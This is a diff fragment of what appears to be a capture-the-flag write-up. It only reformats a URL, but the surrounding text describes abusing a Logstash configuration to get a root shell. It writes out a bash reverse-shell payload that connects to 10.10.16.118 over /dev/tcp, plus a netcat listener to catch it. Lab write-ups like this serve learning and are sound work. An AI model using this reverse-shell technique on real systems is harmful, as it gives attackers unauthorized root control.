@@ -244,7 +244,7 @@ output {
 
 Logstash collects unstructured data from log files and other sources, converts it into structured data, and inserts it into elasticsearch. According to the config, we build payload using this command: `echo 'Ejecutar comando : /bin/bash -i >& /dev/tcp/10.10.16.118/33938 0>&1' > /opt/kibana/logstash_sht2a`
 
-Then access http://10.10.10.115:9200/* to let the elasticsearch refresh its data, then wait about 10s.
+Then access `http://10.10.10.115:9200/*` to let the elasticsearch refresh its data, then wait about 10s.
 
 You will get root shell with `nc -lvp 33938`.
 
